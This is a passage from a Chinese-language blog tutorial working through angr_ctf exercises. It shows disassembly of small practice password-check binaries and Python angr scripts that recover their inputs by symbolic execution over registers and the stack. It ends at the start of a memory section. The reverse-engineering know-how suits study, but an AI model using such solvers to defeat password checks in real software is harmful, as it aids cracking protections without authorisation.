<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+18h] [ebp-40h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+1Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">20</span>]; <span class="comment">// [esp+24h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">20</span>]; <span class="comment">// [esp+38h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">    s2[i] = <span class="number">0</span>;</span><br><span class="line">  qmemcpy(s2, <span class="string">&quot;VXRRJEUR&quot;</span>, <span class="number">8</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s&quot;</span>, s1);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">    s1[j] = complex_function(s1[j], j + <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, s2) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>整体逻辑和前面的题基本相同 引入新的爆破方法 顺便借机研究以下angr执行的模式:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys</span><br><span class="line"></span><br><span class="line">eip_record = []</span><br><span class="line">branch_record = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    eip = state.regs.eip.args[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> eip <span class="keyword">not</span> <span class="keyword">in</span> eip_record:</span><br><span class="line">        eip_record.append(eip)</span><br><span class="line">    <span class="keyword">elif</span> eip <span class="keyword">not</span> <span class="keyword">in</span> branch_record:</span><br><span class="line">        branch_record.append(eip)</span><br><span class="line">    <span class="comment"># return eip == 0x804CA3A</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;EIP:&#x27;</span>, <span class="built_in">hex</span>(eip)[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    eip = state.regs.eip.args[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># return eip == 0x804CA25 </span></span><br><span class="line">    <span class="comment"># print(&#x27;Excute is fail&#x27;)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;02_angr_find_condition&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>:<span class="literal">False</span>&#125;)</span><br><span class="line">    simstate = proj.factory.entry_state()</span><br><span class="line">    simmgr = proj.factory.simgr(simstate)</span><br><span class="line">    simmgr.explore(find=is_succ, avoid=is_fail)</span><br><span class="line">    <span class="comment"># 用新的判断函数来判断是否达成功 可以看出 如果传入的是整数对象就会对比EIP和目标整数 如果是函数对象就会执行函数根据返回值判断是否成功</span></span><br><span class="line">    <span class="keyword">if</span> simmgr.found:</span><br><span class="line">        <span class="built_in">print</span>(simmgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line">        <span class="comment"># print(&quot;\n&quot;.join([hex(addr) for addr in branch_record]))</span></span><br><span class="line">        <span class="comment"># print(&quot;\n&quot;.join([hex(addr) for addr in eip_record]))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<p>去掉注释再执行可以看到实际上<code>.explore</code>函数每次执行<code>is_succ</code>的检测同时会执行<code>is_fail</code> 而每组执行的两个检测传入的<code>state</code>包含了相同(? 至少EIP相同)的运行状态 那么来看看每次执行的时候EIP执行到了哪里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EIP: 8048450</span><br><span class="line">EIP: 8048420</span><br><span class="line">EIP: 8100014</span><br><span class="line">EIP: 804d290</span><br><span class="line">WARNING  | 2024-07-19 15:11:59,957 | angr.storage.memory_mixins.default_filler_mixin | The program is accessing register with an unspecified value. This could indicate unwanted behavior.</span><br><span class="line">WARNING  | 2024-07-19 15:11:59,959 | angr.storage.memory_mixins.default_filler_mixin | angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by:</span><br><span class="line">WARNING  | 2024-07-19 15:11:59,959 | angr.storage.memory_mixins.default_filler_mixin | 1) setting a value to the initial state</span><br><span class="line">WARNING  | 2024-07-19 15:11:59,959 | angr.storage.memory_mixins.default_filler_mixin | 2) adding the state option ZERO_FILL_UNCONSTRAINED_&#123;MEMORY,REGISTERS&#125;, to make unknown regions hold null</span><br><span class="line">WARNING  | 2024-07-19 15:11:59,959 | angr.storage.memory_mixins.default_filler_mixin | 3) adding the state option SYMBOL_FILL_UNCONSTRAINED_&#123;MEMORY,REGISTERS&#125;, to suppress these messages.</span><br><span class="line">WARNING  | 2024-07-19 15:11:59,959 | angr.storage.memory_mixins.default_filler_mixin | Filling register edi with 4 unconstrained bytes referenced from 0x804d291 (__libc_csu_init+0x1 in 02_angr_find_condition (0x804d291))</span><br><span class="line">WARNING  | 2024-07-19 15:11:59,959 | angr.storage.memory_mixins.default_filler_mixin | Filling register ebx with 4 unconstrained bytes referenced from 0x804d293 (__libc_csu_init+0x3 in 02_angr_find_condition (0x804d293))</span><br><span class="line">EIP: 8048480</span><br><span class="line">EIP: 804d299</span><br><span class="line">EIP: 8048394</span><br><span class="line">EIP: 8048480</span><br><span class="line">EIP: 804839d</span><br><span class="line">EIP: 80483b2</span><br><span class="line">EIP: 804d2b1</span><br><span class="line">EIP: 804d2c0</span><br><span class="line">EIP: 8048520</span><br><span class="line">EIP: 804852b</span><br><span class="line">EIP: 80484c0</span><br><span class="line">EIP: 80484f3</span><br><span class="line">EIP: 804d2db</span><br><span class="line">EIP: 804d2e5</span><br><span class="line">EIP: 820104c</span><br><span class="line">EIP: 80485c8</span><br><span class="line">EIP: 804860b</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 8048611</span><br><span class="line">EIP: 80483e0</span><br><span class="line">EIP: 8100004</span><br><span class="line">EIP: 804862e</span><br><span class="line">EIP: 8048430</span><br><span class="line">EIP: 8100018</span><br><span class="line">EIP: 8048642</span><br><span class="line">EIP: 804867f</span><br><span class="line">EIP: 804864e</span><br><span class="line">EIP: 8048569</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 8048575</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048595</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 804866c</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804864e</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 8048569</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 8048575</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048595</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 804866c</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804864e</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 8048569</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 8048575</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048595</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 804866c</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804864e</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 8048569</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 8048575</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048595</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 804866c</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804864e</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 8048569</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 8048575</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048595</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 804866c</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804864e</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 8048569</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 8048575</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048595</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 804866c</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804864e</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 8048569</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 8048575</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048595</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 804866c</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804864e</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 8048569</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 8048575</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048595</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 804866c</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 8048685</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 8048692</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804869f</span><br><span class="line">EIP: 80486ac</span><br><span class="line">EIP: 8048b6c</span><br><span class="line">EIP: 8048dcc</span><br><span class="line">EIP: 8048efc</span><br><span class="line">EIP: 8048f94</span><br><span class="line">EIP: 8048fde</span><br><span class="line">EIP: 80483d0</span><br><span class="line">EIP: 8100000</span><br><span class="line">WARNING  | 2024-07-19 15:12:01,375 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7ffeff2d with 11 unconstrained bytes referenced from 0x8100000 (strcmp+0x0 in extern-address space (0x0))</span><br><span class="line">WARNING  | 2024-07-19 15:12:01,379 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7ffeff50 with 4 unconstrained bytes referenced from 0x8100000 (strcmp+0x0 in extern-address space (0x0))</span><br><span class="line">EIP: 8048fee</span><br><span class="line">EIP: 804900a</span><br><span class="line">EIP: 8048ff5</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 8049017</span><br><span class="line">EIP: 8049002</span><br><span class="line">b&#x27;HETOBRCU&#x27;</span><br></pre></td></tr></table></figure>

<p>结合IDA中的汇编 每一次都是执行到一个块(Block)的开头地址才调用检查函数 关于块 [官方文档][<a href="https://docs.angr.io/en/latest/core-concepts/toplevel.html]%E6%9C%89%E8%A7%A3%E9%87%8A">https://docs.angr.io/en/latest/core-concepts/toplevel.html]有解释</a> 可以看到循环的部分也记录了循环的次数次 但是有分支的部分两个分支都有被记录而且被记录的次序紧挨着 这里猜测执行的模式是先扫描所有块 然后再在关键的块进行快照并爆破 以后再细究</p>
<h2 id="为某段程序的符号执行设定初始值"><a href="#为某段程序的符号执行设定初始值" class="headerlink" title="为某段程序的符号执行设定初始值"></a>为某段程序的符号执行设定初始值</h2><h3 id="angr-symbolic-registers-寄存器的初始化"><a href="#angr-symbolic-registers-寄存器的初始化" class="headerlink" title="angr_symbolic_registers | 寄存器的初始化"></a>angr_symbolic_registers | 寄存器的初始化</h3><p>程序设置的读入函数:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0804890C                               ; int get_user_input()</span><br><span class="line">.text:0804890C                               public get_user_input</span><br><span class="line">.text:0804890C                               get_user_input proc near</span><br><span class="line">.text:0804890C</span><br><span class="line">.text:0804890C                               var_18= dword ptr -18h</span><br><span class="line">.text:0804890C                               var_14= dword ptr -14h</span><br><span class="line">.text:0804890C                               var_10= dword ptr -10h</span><br><span class="line">.text:0804890C                               var_C= dword ptr -0Ch</span><br><span class="line">.text:0804890C</span><br><span class="line">.text:0804890C                               ; __unwind &#123;</span><br><span class="line">.text:0804890C 55                            push    ebp</span><br><span class="line">.text:0804890D 89 E5                         mov     ebp, esp</span><br><span class="line">.text:0804890F 83 EC 18                      sub     esp, 18h</span><br><span class="line">.text:08048912 65 8B 0D 14 00 00 00          mov     ecx, large gs:14h</span><br><span class="line">.text:08048919 89 4D F4                      mov     [ebp+var_C], ecx</span><br><span class="line">.text:0804891C 31 C9                         xor     ecx, ecx</span><br><span class="line">.text:0804891E 8D 4D F0                      lea     ecx, [ebp+var_10]</span><br><span class="line">.text:08048921 51                            push    ecx</span><br><span class="line">.text:08048922 8D 4D EC                      lea     ecx, [ebp+var_14]</span><br><span class="line">.text:08048925 51                            push    ecx</span><br><span class="line">.text:08048926 8D 4D E8                      lea     ecx, [ebp+var_18]</span><br><span class="line">.text:08048929 51                            push    ecx</span><br><span class="line">.text:0804892A 68 93 8A 04 08                push    offset aXXX                     ; &quot;%x %x %x&quot;</span><br><span class="line">.text:0804892F E8 9C FA FF FF                call    ___isoc99_scanf</span><br><span class="line">.text:0804892F</span><br><span class="line">.text:08048934 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:08048937 8B 4D E8                      mov     ecx, [ebp+var_18]</span><br><span class="line">.text:0804893A 89 C8                         mov     eax, ecx</span><br><span class="line">.text:0804893C 8B 4D EC                      mov     ecx, [ebp+var_14]</span><br><span class="line">.text:0804893F 89 CB                         mov     ebx, ecx</span><br><span class="line">.text:08048941 8B 4D F0                      mov     ecx, [ebp+var_10]</span><br><span class="line">.text:08048944 89 CA                         mov     edx, ecx</span><br><span class="line">.text:08048946 90                            nop</span><br><span class="line">.text:08048947 8B 4D F4                      mov     ecx, [ebp+var_C]</span><br><span class="line">.text:0804894A 65 33 0D 14 00 00 00          xor     ecx, large gs:14h</span><br><span class="line">.text:08048951 74 05                         jz      short locret_8048958</span><br><span class="line">.text:08048951</span><br><span class="line">.text:08048953 E8 48 FA FF FF                call    ___stack_chk_fail</span><br><span class="line">.text:08048953</span><br><span class="line">.text:08048958                               locret_8048958:                         ; CODE XREF: get_user_input+45↑j</span><br><span class="line">.text:08048958 C9                            leave</span><br><span class="line">.text:08048959 C3                            retn</span><br></pre></td></tr></table></figure>

<p>最后的结果等效于<code>scanf(&quot;%x %x %x&quot;, eax, ebx, edx)</code> 早期的angr无法一次输入多个数据(现在测试是可以直接按照前两题的做法出结果的) 那就需要我们直接跳过读入数据的过程对eax, ebx, edx赋值 那么这次的simstate就不能设置为<code>entry_state()</code>了 而应该将入口设置为读入数据后一行代码:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/23/20240723-101432.png" alt="image-20240723101425292"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">start_addr = <span class="number">0x804897B</span></span><br><span class="line">simstate = proj.factory.blank_state(addr=start_addr)</span><br></pre></td></tr></table></figure>

<p>然后初始化simstate 将eax, ebx, edx设定为待定值:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">simstate.regs.eax = claripy.BVS(<span class="string">&#x27;eax&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">simstate.regs.ebx = claripy.BVS(<span class="string">&#x27;ebx&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">simstate.regs.edx = claripy.BVS(<span class="string">&#x27;edx&#x27;</span>, <span class="number">32</span>)</span><br><span class="line"><span class="comment"># 如果不想再导入claripy模块可以写成下面的等效写法:</span></span><br><span class="line"><span class="comment"># simstate.regs.eax = simstate.solver.BVS(&#x27;eax&#x27;, 32)</span></span><br></pre></td></tr></table></figure>

<p>完整脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys, claripy</span><br><span class="line"></span><br><span class="line">eip_record = []</span><br><span class="line">branch_record = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;eax: <span class="subst">&#123;<span class="built_in">hex</span>(state.solver.<span class="built_in">eval</span>(state.regs.eax))[<span class="number">2</span>:]&#125;</span> ebx: <span class="subst">&#123;<span class="built_in">hex</span>(state.solver.<span class="built_in">eval</span>(state.regs.ebx))[<span class="number">2</span>:]&#125;</span> edx: <span class="subst">&#123;<span class="built_in">hex</span>(state.solver.<span class="built_in">eval</span>(state.regs.edx))[<span class="number">2</span>:]&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;03_angr_symbolic_registers&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>:<span class="literal">False</span>&#125;)</span><br><span class="line">    start_addr = <span class="number">0x804897B</span></span><br><span class="line">    simstate = proj.factory.blank_state(addr=start_addr)</span><br><span class="line">    simstate.regs.eax = claripy.BVS(<span class="string">&#x27;eax&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">    simstate.regs.ebx = claripy.BVS(<span class="string">&#x27;ebx&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">    simstate.regs.edx = claripy.BVS(<span class="string">&#x27;edx&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">    simmgr = proj.factory.simgr(simstate)</span><br><span class="line">    simmgr.explore(find=is_succ, avoid=is_fail)</span><br><span class="line">    <span class="keyword">if</span> simmgr.found:</span><br><span class="line">        <span class="built_in">print</span>(simmgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<h3 id="angr-symbolic-stack-栈的初始化"><a href="#angr-symbolic-stack-栈的初始化" class="headerlink" title="angr_symbolic_stack | 栈的初始化"></a>angr_symbolic_stack | 栈的初始化</h3><p>和上一题一样 这次的程序要求一次输入两个值 不同的是这次直接存放到栈上 不用寄存器做媒介:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08048679                               ; int handle_user()</span><br><span class="line">.text:08048679                               public handle_user</span><br><span class="line">.text:08048679                               handle_user proc near                   ; CODE XREF: main+21↓p</span><br><span class="line">.text:08048679</span><br><span class="line">.text:08048679                               var_10= dword ptr -10h</span><br><span class="line">.text:08048679                               var_C= dword ptr -0Ch</span><br><span class="line">.text:08048679</span><br><span class="line">.text:08048679                               ; __unwind &#123;</span><br><span class="line">.text:08048679 55                            push    ebp</span><br><span class="line">.text:0804867A 89 E5                         mov     ebp, esp</span><br><span class="line">.text:0804867C 83 EC 18                      sub     esp, 18h</span><br><span class="line">.text:0804867F 83 EC 04                      sub     esp, 4</span><br><span class="line">.text:08048682 8D 45 F0                      lea     eax, [ebp+var_10]</span><br><span class="line">.text:08048685 50                            push    eax</span><br><span class="line">.text:08048686 8D 45 F4                      lea     eax, [ebp+var_C]</span><br><span class="line">.text:08048689 50                            push    eax</span><br><span class="line">.text:0804868A 68 B3 87 04 08                push    offset aUU                      ; &quot;%u %u&quot;</span><br><span class="line">.text:0804868F E8 DC FC FF FF                call    ___isoc99_scanf</span><br><span class="line">.text:0804868F</span><br><span class="line">.text:08048694 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:08048697 8B 45 F4                      mov     eax, [ebp+var_C]</span><br><span class="line">.text:0804869A 83 EC 0C                      sub     esp, 0Ch</span><br><span class="line">.text:0804869D 50                            push    eax</span><br><span class="line">.text:0804869E E8 06 FE FF FF                call    complex_function0</span><br><span class="line">.text:0804869E</span><br><span class="line">.text:080486A3 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:080486A6 89 45 F4                      mov     [ebp+var_C], eax</span><br><span class="line">.text:080486A9 8B 45 F0                      mov     eax, [ebp+var_10]</span><br><span class="line">.text:080486AC 83 EC 0C                      sub     esp, 0Ch</span><br><span class="line">.text:080486AF 50                            push    eax</span><br><span class="line">.text:080486B0 E8 DC FE FF FF                call    complex_function1</span><br><span class="line">.text:080486B0</span><br><span class="line">.text:080486B5 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:080486B8 89 45 F0                      mov     [ebp+var_10], eax</span><br><span class="line">.text:080486BB 8B 45 F4                      mov     eax, [ebp+var_C]</span><br><span class="line">.text:080486BE 3D D1 24 30 77                cmp     eax, 773024D1h</span><br><span class="line">.text:080486C3 75 0A                         jnz     short loc_80486CF</span><br><span class="line">.text:080486C3</span><br><span class="line">.text:080486C5 8B 45 F0                      mov     eax, [ebp+var_10]</span><br><span class="line">.text:080486C8 3D CF 11 43 BC                cmp     eax, 0BC4311CFh</span><br><span class="line">.text:080486CD 74 12                         jz      short loc_80486E1</span><br><span class="line">.text:080486CD</span><br><span class="line">.text:080486CF</span><br><span class="line">.text:080486CF                               loc_80486CF:                            ; CODE XREF: handle_user+4A↑j</span><br><span class="line">.text:080486CF 83 EC 0C                      sub     esp, 0Ch</span><br><span class="line">.text:080486D2 68 B9 87 04 08                push    offset s                        ; &quot;Try again.&quot;</span><br><span class="line">.text:080486D7 E8 74 FC FF FF                call    _puts</span><br><span class="line">.text:080486D7</span><br><span class="line">.text:080486DC 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:080486DF EB 10                         jmp     short loc_80486F1</span><br><span class="line">.text:080486DF</span><br><span class="line">.text:080486E1                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:080486E1</span><br><span class="line">.text:080486E1                               loc_80486E1:                            ; CODE XREF: handle_user+54↑j</span><br><span class="line">.text:080486E1 83 EC 0C                      sub     esp, 0Ch</span><br><span class="line">.text:080486E4 68 C4 87 04 08                push    offset aGoodJob                 ; &quot;Good Job.&quot;</span><br><span class="line">.text:080486E9 E8 62 FC FF FF                call    _puts</span><br><span class="line">.text:080486E9</span><br><span class="line">.text:080486EE 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:080486EE</span><br><span class="line">.text:080486F1</span><br><span class="line">.text:080486F1                               loc_80486F1:                            ; CODE XREF: handle_user+66↑j</span><br><span class="line">.text:080486F1 90                            nop</span><br><span class="line">.text:080486F2 C9                            leave</span><br><span class="line">.text:080486F3 C3                            retn</span><br></pre></td></tr></table></figure>

<p>输入函数等效于<code>scanf(&quot;%u %u&quot;, [val0](ebp - 0xC), [val1](ebp - 0x10))</code> 为了在栈上正确的位置进行值的符号化 简单看一下栈输入完后栈的结构:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">       ebp - 4          ebp - 10h</span><br><span class="line">...|  ebx  |  ...  |  val0  |  val1  | ...</span><br><span class="line">ebp - 0         ebp - 8h         ebp - Ch</span><br></pre></td></tr></table></figure>

<p>也就是说第一个值在ebp-8到ebp-10h之间 第二个在ebp-10h到ebp-C之间 为了模拟进入函数的过程 初始状态中将esp赋给ebp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">state = proj.factory.blank_state(addr = <span class="number">0x8048697</span>)</span><br><span class="line">state.regs.ebp = state.regs.esp</span><br></pre></td></tr></table></figure>

<p>再对ebp-8处的栈空间进行符号化:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p1 = claripy.BVS(<span class="string">&#x27;p1&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">p2 = claripy.BVS(<span class="string">&#x27;p2&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">state.stack_push(p1)</span><br><span class="line">state.stack_push(p2)</span><br></pre></td></tr></table></figure>

<p>完整脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys, claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;04_angr_symbolic_stack&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    state = proj.factory.blank_state(addr = <span class="number">0x8048697</span>)</span><br><span class="line">    state.regs.ebp = state.regs.esp</span><br><span class="line">    state.regs.esp -= <span class="number">8</span></span><br><span class="line">    p1 = claripy.BVS(<span class="string">&#x27;p1&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">    p2 = claripy.BVS(<span class="string">&#x27;p2&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">    state.stack_push(p1)</span><br><span class="line">    state.stack_push(p2)</span><br><span class="line">    simgr = proj.factory.simulation_manager(state)</span><br><span class="line">    simgr.explore(find=is_succ, avoid=is_fail)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;p1: <span class="subst">&#123;<span class="built_in">hex</span>(simgr.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(p1))&#125;</span>\np2: <span class="subst">&#123;<span class="built_in">hex</span>(simgr.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(p2))&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Answer not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<h3 id="angr-symbolic-memory-内存空间初始化1"><a href="#angr-symbolic-memory-内存空间初始化1" class="headerlink" title="angr_symbolic_memory | 内存空间初始化1"></a>angr_symbolic_memory | 内存空间初始化1</h3><p>如果程序要用到的值不是本地变量而是全局变量 那就需要对对应的内存区域进行符号化再求解 这题校验的值放在<code>.bss</code>段上:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/24/20240724-112406.png" alt="image-20240724112359400"></p>
